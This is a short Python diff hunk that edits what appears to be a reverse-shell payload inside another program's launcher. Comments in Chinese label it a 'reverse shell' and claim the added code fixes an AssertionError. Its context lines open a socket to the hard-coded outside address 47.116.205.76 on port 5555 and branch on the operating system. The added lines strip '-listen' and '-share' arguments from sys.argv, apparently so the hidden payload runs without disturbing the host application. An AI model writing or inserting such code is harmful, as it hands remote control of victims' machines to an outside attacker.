@@ -1,5 +1,9 @@
 try:
-    import socket, subprocess, os, platform
+    import socket, subprocess, os, platform, sys
+    # 删除CMD变量中的 -listen 或 -share 参数以解决 AssertionError
+    if hasattr(sys, 'argv'):
+        sys.argv = [arg for arg in sys.argv if arg not in ['-listen', '--listen', '-share', '--share']]
+    # 反弹shell
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("47.116.205.76", 5555))
     if platform.system() == "Windows":
